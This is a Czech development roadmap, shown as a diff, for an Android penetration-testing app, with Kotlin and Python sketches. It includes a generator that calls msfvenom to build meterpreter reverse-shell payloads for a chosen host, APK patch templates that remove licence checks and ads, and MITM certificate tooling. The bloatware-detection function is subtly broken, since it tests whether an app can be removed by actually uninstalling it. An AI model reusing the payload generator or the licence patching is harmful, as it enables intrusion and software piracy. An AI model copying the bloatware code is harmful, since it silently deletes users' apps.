+- [ ] Built-in patch šablony (remove license, remove ads, enable debug)
+- [ ] Custom smali patches (pro pokročilé uživatele)
+- [ ] Backup původního APK před patchem
+- [ ] Instalace patchnutého APK přes Shizuku
+
+### 3.3 Package Manager — System App Uninstaller
+
+**Podobně jako Canta + Lucky Patcher:**
+
+```kotlin
+// PackageManagerShizuku.kt
+class PrivilegedPackageManager {
+    
+    /** Seznam systémových appek (s bloatware detekcí) */
+    fun getSystemApps(): List<AppInfo> {
+        val output = Shizuku.run("pm list packages -s")  // system apps
+        return output.lines().mapNotNull { line ->
+            val pkg = line.removePrefix("package:")
+            getAppInfo(pkg)
+        }.sortedByDescending { it.isBloatware }
+    }
+    
+    /** Detekce bloatware */
+    private fun detectBloatware(packageName: String): BloatScore {
+        val patterns = listOf(
+            "facebook", "twitter", "tiktok", "instagram",
+            "linkedin", "netflix", "spotify", "opra",
+            "game", "facebook", "bixby", "duo",
+            "gmail", "maps", "youtube", "chrome"
+        )
+        
+        val score = patterns.count { packageName.contains(it, ignoreCase = true) }
+        val isRemovable = Shizuku.run("pm uninstall --user 0 $packageName 2>&1")
+            .contains("Success")
+        
+        return BloatScore(score, isRemovable)
+    }
+    
+    /** Odinstalace systémové appky */
+    fun uninstallSystemApp(packageName: String): Boolean {
+        val result = Shizuku.run("pm uninstall --user 0 $packageName 2>&1")
+        return result.contains("Success")
+    }
+    
+    /** Reinstalace (pro omylem smazané) */
+    fun reinstallSystemApp(packageName: String) {
+        // pm install-existing <package>
+        Shizuku.run("pm install-existing $packageName")
+    }
+}
+```
+
+**Feature návrh:**
+- [ ] Canta-like seznam systémových appek s detekcí bloatware
+- [ ] Bezpečnostní kategorie: "Safe to remove", "System critical", "Unknown"
+- [ ] Hromadná odinstalace (batch remove)
+- [ ] Možnost zálohy APK před smazáním
+- [ ] Historie odinstalací (možnost vrátit zpět)
 
 ---
 
-## 7. 24h souhrn
+## 🔬 4. Vylepšení Stávajících Modulů
 
-Samostatný job (WorkManager, 1×/den), čte **pouze** `daily_stats` — nikdy raw flow záznamy ani `known_addresses` v plném rozsahu. Výstup: krátký text pro notifikaci/log, žádné volání LLM s velkým kontextem.
+### 4.1 USB Host OTG — UI + SCM_RIGHTS (z existujícího plánu pokračovat)
 
----
+**Současný stav v PLAN.md:** Už máte Fáze 1-4 rozepsané, některé hotové.
 
-## 8. Pořadí implementace
+**Inspirace z Lucky Patcher:** Práce s file descriptorem přes SCM_RIGHTS je správná cesta.
+Doplnit:
 
-1. `TrafficAggregator.kt` + SQLite schéma (čistě mechanické, bez AI, testovatelné samostatně)
-2. Úprava `AIBrain.kt` výstupu na confidence float místo binárního verdiktu
-3. Rozšíření `ai-agent.py` o 6 tool-callů (sekce 4) + kompaktní JSON parser (sekce 3)
-4. Napojení `enable_mitm_for_flow` na `createCaptureOnlySslContext()` (existující, jen nový trigger)
-5. Notifikační smyčka Allow/Deny → zápis `verdict_source='user_confirmed'`
-6. Phoenix export (sekce 5) — poslední krok, protože je čistě observabilita, nic nekritického na ní nezávisí
-7. `vpn_memory.md` — oddělený soubor od picoding memory skillu, stejný princip (LLM čte trasování → zapisuje ponaučení)
-8. Až bude dost `user_confirmed` dat v Phoenixu → export pro fine-tuning
+- [ ] UI panel pro USB zařízení (podobný `nh usb list` ale graficky)
+- [ ] Indikátor připojeného zařízení v notifikační liště
+- [ ] Auto-claim rozhraní pro známá VID:PID
+- [ ] Log bulk transferů pro debugging
 
----
+### 4.2 AI Brain — FunctionGemma jako On-Device Vrstva
 
-## 9. Výběr modelů pro LLM Arbiter
-
-### 9.1 Dvě role, dva různé modely
-
-`AIBrain.kt` (Vrstva 1) zůstává tabulkový ONNX klasifikátor — netýká se ho fine-tune LLM. Fine-tune/výběr modelu se řeší jen pro **LLM Arbiter** (Vrstva 3) a nově navrhovanou **odlehčenou mezivrstvu**.
-
-### 9.2 FunctionGemma — nová mezivrstva mezi Vrstvou 2 a 3
-
-Google vydal **FunctionGemma** (postaven na Gemma 3 270M), model specializovaný na function calling, popsaný přímo jako "traffic controller": zvládá běžné případy on-device a složité eskaluje na větší model. To se kryje s architekturou tohoto plánu skoro 1:1:
-
+**Z existujícího plánu:**
 ```
-FunctionGemma (270M, on-device, Termux)   →   Claude/Gemma 3 27B (cloud, dnešní Vrstva 3)
-= vyřeší jednoduché/jasné verdikty            = jen nejasné případy, které
-  přímo v telefonu, bez volání cloudu           FunctionGemma neumí rozhodnout
+AIBrain (ONNX, Vrstva 1)
+  → TrafficAggregator (SQLite dedup, Vrstva 2)
+    → FunctionGemma 270M (ON-DEVICE, nová mezivrstva)
+      → Cloud LLM (Claude/Gemma 27B, Vrstva 3)
 ```
 
-- Běží přes llama.cpp/Ollama v Termuxu, kvantizovaný GGUF, nízká paměťová náročnost
-- LoRA fine-tune na `user_confirmed` datech z Phoenixu (trénink mimo telefon, na Colab T4 zdarma; na telefon se nasadí jen hotový kvantizovaný model)
-- Efekt: méně volání na cloud model → nižší náklady i spotřeba dat/baterie
+**Inspirace z Canta:** Minimalismus a efektivita. FunctionGemma 270M běží přes `llama.cpp` v Termuxu, spotřeba < 200 MB RAM.
 
-### 9.3 MET-LLM vs. TrafficLLM (Vrstva 1, volitelné vylepšení)
-
-- **MET-LLM** — teoreticky přesně sedí na detekci malicious encrypted traffic, ale kód je zatím **jen částečně zveřejněný** (autoři slibují zbytek "brzy") — nespoléhat se na něj v produkci teď
-- **TrafficLLM** — plně dostupná alternativa se stejnou myšlenkou (univerzální adaptace LLM na reprezentaci síťového toku), veřejné váhy (6B), funkční repo — použitelné jako experiment pro přesnější klasifikaci ve Vrstvě 1, **nenahrazuje** ONNX `AIBrain.kt`, jen ho může doplnit/porovnat
-
-### 9.4 Doporučené pořadí zkoušení
-
-1. FunctionGemma jako lokální mezivrstva — nejrychlejší reálný přínos, přímo zapadá do stávajícího návrhu
-2. TrafficLLM jako paralelní experiment nad Vrstvou 1 (A/B proti `AIBrain.kt`, ne náhrada)
-3. MET-LLM sledovat, až zveřejní zbytek kódu
-
----
-
-## 10. Dodatek — ochrana proti "zastaralému" verdiktu (drift detekce)
-
-### Problém, který současný návrh neřeší
-
-Jakmile má adresa jednou `verdict != unknown`, systém ji **navždy potichu suppressuje** (sekce 2–4). To je správné pro úsporu kontextu, ale má slabinu: IP adresy a domény se v čase mění vlastníka (sdílený cloud hosting, CDN, expirované domény přebrané útočníkem). Adresa jednou správně vyhodnocená jako `allowed` může za měsíc sloužit úplně jinému, škodlivému účelu — a systém by o tom už nikdy nevěděl.
-
-### Navrhované řešení: baseline drift check
-
-Do `TrafficAggregator.kt` přidat lehkou kontrolu **odchylky od vlastní historie** adresy, ne jen jednorázové rozhodnutí:
-
-```sql
-ALTER TABLE known_addresses ADD COLUMN baseline_entropy REAL;
-ALTER TABLE known_addresses ADD COLUMN baseline_interval_sec INTEGER;
-ALTER TABLE known_addresses ADD COLUMN last_reverify_at INTEGER;
+**Nový návrh:**
+```python
+# ai_agent.py — FunctionGemma wrapper
+class FunctionGemmaArbiter:
+    """Lehký on-device rozhodovač, který odfiltruje 80+ % případů."""
+    
+    MODEL_PATH = "/data/data/com.linux_core/files/functiongemma-270m-Q4_K_M.gguf"
+    
+    def __init__(self):
+        self.llm = llama_cpp.Llama(
+            model_path=self.MODEL_PATH,
+            n_ctx=2048,      # malý kontext — stačí na jednu dávku
+            n_threads=4,     # využije 4 jádra
+            n_gpu_layers=0,  # CPU only (GPU by žralo baterii)
+        )
+    
+    def decide(self, pending_flows: list) -> list:
+        """Vrátí verdikty pro dávku flow. Eskaluje nejasné na cloud."""
+        prompt = self._build_prompt(pending_flows)
+        response = self.llm.create_chat_completion(
+            messages=[{"role": "user", "content": prompt}],
+            tools=TOOLS_DEFINITIONS,
+            temperature=0.1,  # nízká teplota = konzistentní verdikty
+        )
+        
+        results = self._parse_response(response)
+        escalation = [r for r in results if r.confidence < 0.6]
+        auto_decided = [r for r in results if r.confidence >= 0.6]
+        
+        return {
+            "auto": auto_decided,       # >80 % případů
+            "escalate": escalation,     # <20 % na cloud LLM
+        }
 ```
 
-- Při každém výskytu už **známé** adresy se porovná aktuální `entropy`/`interval` s uloženým baseline (z doby, kdy padl verdikt)
-- Pokud odchylka překročí práh (např. entropie skočí o >0.3, nebo se interval zkrátí 5×) → adresa se **i přes existující verdikt** znovu zařadí do `pending_flows` s příznakem `reason=drift`
-- Toto je čistě mechanická kontrola (žádný LLM), stejně levná jako dedup logika — LLM se volá jen když drift skutečně nastane
-- `last_reverify_at` navíc umožňuje i pasivní re-check (např. jednou za 30 dní i bez driftu) pro adresy s `verdict=allowed` a vysokým `occurrence_count`, jako druhou pojistku
+### 4.3 Certificate Management UX
 
-**Analogie:** i důvěryhodný zaměstnanec se známou kartou dostane pravidelnou revizi přístupu, ne jen jednorázové schválení navždy — a pokud se najednou začne chovat nezvykle (jiná doba příchodu, jiné oddělení), ostraha si ho znovu všimne, i když kartu má platnou.
+**Inspirace z Lucky Patcher:** Detailní správa certifikátů.
 
-### Kam patří v pořadí implementace (návaznost na sekci 8)
+**Současný stav:** Pouze tlačítko "KOPÍROVAT CA" ve `VpnSecurityTab`.
 
-Zařadit **po kroku 1** (`TrafficAggregator.kt` + SQLite), protože je to rozšíření stejné tabulky/logiky, ne samostatná fáze.
+**Návrh na vylepšení:**
+- [ ] CA Installation Wizard (jako AdGuard)
+- [ ] Status: nainstalováno / nenainstalováno / expiruje za N dní
+- [ ] Možnost vygenerovat nový CA pár v AndroidKeyStore
+- [ ] Import/export CA certifikátu (PEM, DER, PKCS12)
+- [ ] Seznam podepsaných server certifikátů (MITM sessions)
+- [ ] Expirační notifikace (30 dní před koncem platnosti CA)
+
+```kotlin
+// CertificateManagerUI.kt
+@Composable
+fun CertificateManagementScreen(certManager: CertificateManager) {
+    val caCert = certManager.getCaCertificate()
+    val expiryDays = caCert?.let { 
+        TimeUnit.MILLISECONDS.toDays(it.notAfter.time - System.currentTimeMillis())
+    }
+    
+    Column {
+        // Status card
+        Card {
+            Row {
+                Icon(Icons.Default.Security, "CA Status")
+                Column {
+                    Text("MITM Certificate Authority")
+                    Text("Expires: ${caCert?.notAfter}")
+                    if (expiryDays != null && expiryDays < 30) {
+                        Text("⚠️ Expires in $expiryDays days", color = Color.Red)
+                    }
+                }
+            }
+        }
+        
+        // Actions
+        Button("Generate New CA") { 
+            certManager.generateNewCaInKeyStore() 
+        }
+        Button("Export CA Certificate") { 
+            certManager.exportToFile() 
+        }
+        Button("Open Installation Guide") { 
+            showInstallationWizard() 
+        }
+        
+        // Signed certs list
+        LazyColumn {
+            items(certManager.getSignedCertificates()) { cert ->
+                CertificateItem(cert)
+            }
+        }
+    }
+}
+```
 
 ---
 
-## 11. Bezpečnostní kontrolní seznam (návaznost na SECURITY_AUDIT.md)
+## 🧪 5. Experimentální Funkce (Future Roadmap)
 
-- [ ] Nové tool-cally v `ai-agent.py` nesmí obcházet Bearer token auth `LocalApiServer`
-- [ ] `enable_mitm_for_flow` limitovat na max 60s a jen capture-only (nikdy proxy-through globálně)
-- [ ] Fail-safe default = Deny při vypršení notifikačního timeoutu
-- [ ] Phoenix export nesmí nikdy blokovat ani shodit rozhodovací smyčku (viz try/except v sekci 5)
-- [ ] `pending_flows` TTL cleanup, aby tabulka nerostla neomezeně
-- [ ] Žádné absolutní GPS/cellinfo data v telemetrii — jen síťové atributy
-- [ ] Drift re-verifikace (sekce 10) nesmí sama vytvořit nekonečnou smyčku eskalací — limitovat na 1 re-eskalaci za 24h na adresu
+### 5.1 XFCE jako Android Launcher (z existujícího plánu)
+
+Zachovat a rozšířit:
+- [ ] VNC View integrace (bVNC core)
+- [ ] FREE form Window Management pro Android appky
+- [ ] Sidebar s Android apps
+- [ ] Klávesové zkratky pro přepínání mezi Linux a Android
+
+### 5.2 Automatic Payload Generator
+
+**Inspirace z Lucky Patcher + NetHunter pentest poslání:**
+
+```kotlin
+// PayloadGenerator.kt
+class PayloadGenerator {
+    fun generateMsfvenom(lhost: String, lport: Int, platform: Platform): File {
+        val payload = when (platform) {
+            Platform.ANDROID -> "android/meterpreter/reverse_tcp"
+            Platform.LINUX -> "linux/x64/meterpreter_reverse_tcp"
+            Platform.WINDOWS -> "windows/x64/meterpreter_reverse_tcp"
+        }
+        
+        val output = File(cacheDir, "payload_${platform.name}_$lport.apk")
+        
+        terminalService.execute(
+            "msfvenom -p $payload LHOST=$lhost LPORT=$lport " +
+            "-o ${output.absolutePath}"
+        )
+        
+        return output
+    }
+}
+```
+
+### 5.3 Session Manager — Lucky Patcher Backup Styl
+
+**Cíl:** Ukládat a obnovovat kompletní PRoot session včetně:
+- Nainstalovaných balíčků
+- Konfiguračních souborů
+- Network nastavení
+- AI Brain databáze
+
+```kotlin
+// SessionManager.kt
+class SessionBackupManager {
+    fun createSnapshot(name: String): Snapshot {
+        val timestamp = System.currentTimeMillis()
+        val backupDir = File(sdcardDir, "NetHunter/backups/$name-$timestamp")
+        
+        return Snapshot(
+            name = name,
+            packages = getInstalledPackages(),  // dpkg --get-selections
+            configs = backupConfigFiles(),
+            vpnSettings = vpnSettings.export(),
+            brainData = aiBrain.exportKnowledge(),
+            timestamp = timestamp,
+            sizeBytes = 0  // dopočítat
+        )
+    }
+    
+    fun restoreSnapshot(snapshot: Snapshot) {
+        // 1. Obnovit balíčky
+        restorePackages(snapshot.packages)
+        
+        // 2. Obnovit konfigurace
+        restoreConfigFiles(snapshot.configs)
+        
+        // 3. Obnovit VPN nastavení
+        vpnSettings.import(snapshot.vpnSettings)
+        
+        // 4. Obnovit AI Brain
+        aiBrain.importKnowledge(snapshot.brainData)
+    }
+}
+```
+
+### 5.4 Network Profile Switcher
+
+**Jako HappyMod profilová tlačítka, ale pro síťové scénáře:**
+
+| Profil | VPN | MITM | AI Brain | Firewall | Použití |
+|--------|-----|------|----------|----------|---------|
+| 🛡️ **Stealth** | ON | OFF | ON (aggressive) | Block all unknown | Běžná bezpečnost |
+| 🔍 **Recon** | ON | ON (capture) | ON (logging) | Allow all | Skenování sítě |
+| 🚀 **Gaming** | OFF | OFF | OFF | Allow all | Nízká latence |
+| 🔐 **Banking** | ON | OFF | ON | Block all except banking | Finanční transakce |
+| 🧪 **Test** | OFF | ON (full) | OFF | Allow all | Vývoj a testování |
+
+```kotlin
+// NetworkProfile.kt
+data class NetworkProfile(
+    val name: String,
+    val icon: String,
+    val vpnEnabled: Boolean,
+    val mitmMode: MitmMode,        // OFF, CAPTURE_ONLY, FULL
+    val aiBrainMode: AiMode,       // OFF, LOGGING, ACTIVE
+    val firewallPolicy: FirewallPolicy  // ALLOW_ALL, BLOCK_UNKNOWN, STRICT
+)
+
+class ProfileSwitcher {
+    fun applyProfile(profile: NetworkProfile) {
+        when (profile.vpnEnabled) {
+            true -> vpnManager.start()
+            false -> vpnManager.stop()
+        }
+        
+        when (profile.mitmMode) {
+            MitmMode.CAPTURE_ONLY -> mitmEngine.startCaptureOnly()
+            MitmMode.FULL -> mitmEngine.startFull()
+            MitmMode.OFF -> mitmEngine.stop()
+        }
+        
+        // ... atd
+    }
+}
+```
+
+---
+
+## 📋 6. Technický Dluh — Priority
+
+### 🔴 Ihned (sprint 1-2)
+
+| # | Úkol | Inspirace | Odhad |
+|---|------|-----------|-------|
+| 1 | Zvednout targetSdk na 35 | Canta | 2-3 dny |
+| 2 | Přidat progress notifikaci pro rootfs download | HappyMod | 1 den |
+| 3 | Permission audit — oddělit runtime-only | Canta | 0.5 dne |
+
+### 🟡 Do měsíce (sprint 3-4)
+
+| # | Úkol | Inspirace | Odhad |
+|---|------|-----------|-------|
+| 4 | appops GUI manager | Lucky Patcher | 3-4 dny |
+| 5 | Boot orchestrace (WorkManager) | HappyMod | 2 dny |
+| 6 | FunctionGemma on-device arbiter | (vlastní) | 5-7 dní |
+| 7 | Certificate Installation Wizard | AdGuard (z CA analysis) | 2 dny |
+
+### 🟢 Do kvartálu
+
+| # | Úkol | Inspirace | Odhad |
+|---|------|-----------|-------|
+| 8 | APK Recompilation Engine | Lucky Patcher | 2-3 týdny |
+| 9 | Network Profile Switcher | (vlastní) | 1 týden |
+| 10 | XFCE Android Launcher | (z existujícího plánu) | 2-3 týdny |
+| 11 | Session Backup Manager | Lucky Patcher | 1 týden |
+
+---
+
+## 📐 7. Architektonické Diagramy
+
+### 7.1 AppOps Manager — architektura
+
+```
+┌──────────────────────────────────────────────┐
+│  AppOpsScreen.kt (Compose UI)                │
+│  ┌────────────────────────────────────────┐  │
+│  │  SearchBar                             │  │
+│  │  ┌────────────────────────────────┐    │  │
+│  │  │  AppItem(pkg, opCount, score)  │    │  │
+│  │  │  AppItem(pkg, opCount, score)  │    │  │
+│  │  │  ...                           │    │  │
+│  │  └────────────────────────────────┘    │  │
+│  └────────────────────────────────────────┘  │
+│                      │                        │
+│              click na appku                   │
+│                      ▼                        │
+│  ┌────────────────────────────────────────┐  │
+│  │  AppOpsDetailSheet                     │  │
+│  │  ┌──────┬─────────────────────────┐    │  │
+│  │  │ Op   │ Toggle allow/deny      │    │  │
+│  │  │ CAM  │ [ALLOW] [DENY]         │    │  │
+│  │  │ LOC  │ [ALLOW] [DENY]         │    │  │
+│  │  │ MIC  │ [ALLOW] [DENY]         │    │  │
+│  │  │ PHONE│ [ALLOW] [DENY]         │    │  │
+│  │  │ SMS  │ [ALLOW] [DENY]         │    │  │
+│  │  └──────┴─────────────────────────┘    │  │
+│  │  [Three Finger Lockdown]               │  │
+│  └────────────────────────────────────────┘  │
+└──────────────────────────────────────────────┘
+         │                     ▲
+         ▼                     │
+┌──────────────────────────────────────────────┐
+│  AppOpsShizukuManager.kt                    │
+│  ┌────────────────────────────────────────┐ │
+│  │  getAllPackagesWithOps()                │ │
+│  │  getAppOpsForPackage(pkg)              │ │
+│  │  setOp(pkg, op, mode)                  │ │
+│  │  lockdownThreeFingers(pkg)             │ │
+│  └────────────────────────────────────────┘ │
+└──────────────────────────┬───────────────────┘
+                           │
+                    ┌──────▼──────┐
+                    │  Shizuku    │
+                    │  API        │
+                    └──────┬──────┘
+                           │
+                    ┌──────▼──────┐
+                    │  appops     │
+                    │  (Android)  │
+                    └─────────────┘
+```
+
+### 7.2 Downlad Manager Pipeline
+
+```
+User clicks "Download Kali"
+         │
+         ▼
+┌──────────────────┐
+│  DownloadService │─── startForeground ───▶  [🔽 Kali rootfs 45%]
+│  .kt             │                         [Notification]
+└──────┬───────────┘
+       │
+       ├─▶ HTTP GET (Range: bytes=N-)
+       │    │
+       │    ├─▶ Progress → Notification update
+       │    ├─▶ Pause → save Range offset
+       │    └─▶ Complete → verify SHA256
+       │
+       ├─▶ [OK] → extract to PRoot directory
+       │    │
+       │    ├─▶ tar -xJf kali-rootfs.tar.xz -C ~/kali-arm64/
+       │    └─▶ rm kali-rootfs.tar.xz
+       │
+       └─▶ [FAIL] → Notification + retry after 30s
+```
+
+---
+
+## 🏆 8. Shrnutí — Co si vzít z každého APK
+
+| APK | Hlavní ponaučení | Implementovat jako |
+|-----|------------------|--------------------|
+| **Canta** | Moderní Android, čistý kód, málo permissions | targetSdk 35, permission audit, Shizuku best practices |
+| **HappyMod** | Download UX, background orchestrace, notifikace | Rootfs download manager, WorkManager jobs, boot receiver |
+| **Lucky Patcher** | System-level modifikace, appops, APK patching | AppOps GUI, APK Recompiler, Package Manager |
+
+---
+
+## 📎 Příloha: Existující Komponenty (co už máte a na co navázat)
+
+```kotlin
+// AIBrain.kt — ONNX klasifikátor
+// TlsMitmEngine.kt — MITM engine
+// RootCaInstaller.kt — CA management
+// VpnNatEngine.kt — VPN NAT
+// Shizuku — již integrován
+// BackupService.kt — backup (rozšířit)
+// OffensiveEngine.kt — notifikace s timeoutem
+// LocalApiServer.kt — API bridge port 1337
+// ai-agent.py — ReAct agent port 13338
+```
+
+---
+
+*Dokument vytvořen 2026-07-17 na základě reverzní analýzy APK a existující dokumentace projektu.*
